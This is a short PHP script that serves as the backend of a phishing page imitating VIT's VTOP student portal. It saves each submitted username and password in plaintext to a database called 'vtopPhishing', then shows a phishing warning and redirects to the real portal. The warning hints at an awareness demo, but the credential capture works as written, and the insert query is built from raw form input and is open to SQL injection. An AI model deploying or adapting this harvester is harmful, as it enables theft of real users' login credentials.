<?php
$conn=mysqli_connect("localhost","root","","vtopPhishing");
$uname=$_POST["uname"];
$passwd = $_POST["passwd"];
$sql = "INSERT INTO `Login Details`(`Username`, `Password`) VALUES ('$uname','$passwd')";
mysqli_query($conn,$sql);

echo "<script>if (confirm('Beware of Phishing, Change your VTOP Password ASAP!!')) {window.location = 'https://vtop.vit.ac.in/';} </script>";
exit;
?>